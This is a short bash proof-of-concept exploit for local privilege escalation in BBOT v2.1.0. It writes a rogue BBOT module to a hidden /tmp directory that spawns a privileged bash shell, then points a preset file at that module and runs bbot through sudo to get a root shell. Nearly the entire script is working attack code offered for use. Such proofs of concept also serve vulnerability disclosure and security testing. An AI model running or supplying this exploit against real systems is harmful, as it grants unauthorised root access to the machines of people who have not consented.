#!/usr/bin/env bash

# Title  : BBOT v2.1.0 - Local Privilege Escalation - PoC Exploit
# Author : Ravindu Wickramasinghe (aka rvz)
# Usage  : usage: ./exploit.sh

#!/bin/bash
set -e
D="/tmp/.x"; M="x.py"; P="p.yml"; N="x"

trap 'rm -rf "$D"' EXIT

mkdir -p "$D"

cat > "$D/$M" <<EOF
from bbot.modules.base import BaseModule
import pty
class $N(BaseModule):
 async def setup(self): pty.spawn(["/bin/bash", "-p"])
EOF

cat > "$D/$P" <<EOF
description: x
module_dirs: [$D]
modules: [$N]
EOF

sudo /usr/local/bin/bbot -t x -p "$D/$P" --event-types ROOT || true

